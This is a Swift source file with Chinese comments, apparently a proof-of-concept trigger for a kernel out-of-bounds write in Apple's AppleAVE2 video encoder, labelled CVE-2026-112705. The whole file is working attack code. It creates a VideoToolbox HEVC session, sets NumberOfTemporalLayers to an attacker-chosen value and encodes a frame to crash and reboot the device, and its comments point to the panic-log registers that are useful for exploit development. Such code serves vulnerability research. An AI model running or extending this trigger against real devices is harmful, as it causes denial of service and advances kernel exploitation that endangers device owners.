import Foundation
import VideoToolbox

/// AppleAVE2 触发台：CVE-2026-112705
/// 通过 VideoToolbox 设置 NumberOfTemporalLayers，触发内核越界写。
/// 每次触发会重启设备，panic 日志里记录 far / x19 / PC。
enum CrashLab {

    /// - Parameters:
    ///   - n: NumberOfTemporalLayers 取值
    ///   - log: 日志回调
    static func fire(n: Int, log: @escaping (String) -> Void) {
        log("NTL = \(n) 开始")
        var session: VTCompressionSession?
        let status = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault,
            width: 1920, height: 1080,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: nil,
            imageBufferAttributes: nil,
            compressedDataAllocator: nil,
            outputCallback: nil,
            refcon: nil,
            compressionSessionOut: &session)
        log("VTCompressionSessionCreate -> \(status)")
        guard status == noErr, let s = session else {
            log("创建失败，换 codec 或降分辨率再试")
            return
        }

        let key = "NumberOfTemporalLayers" as CFString
        let val = NSNumber(value: n)
        let setStatus = VTSessionSetProperty(s, key: key, value: val)
        log("SetProperty(NumberOfTemporalLayers=\(n)) -> \(setStatus)")

        // 准备一帧并编码，触发驱动路径
        var pb: CVPixelBuffer?
        let attrs: [CFString: Any] = [
            kCVPixelBufferIOSurfacePropertiesKey: [:] as CFDictionary,
            kCVPixelBufferPixelFormatTypeKey: kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        ]
        CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            attrs as CFDictionary, &pb)
        guard let pix = pb else { log("CVPixelBuffer 创建失败"); return }

        var flagsOut = VTEncodeInfoFlags()
        let encStatus = VTCompressionSessionEncodeFrame(
            s, imageBuffer: pix,
            presentationTimeStamp: CMTime(value: 0, timescale: 30),
            duration: CMTime(value: 1, timescale: 30),
            frameProperties: nil, infoFlagsOut: &flagsOut) { _, _, _ in }
        log("EncodeFrame -> \(encStatus)（若在此处重启，说明触发成功）")
        VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
        log("NTL = \(n) 完成，未崩溃")
    }
}
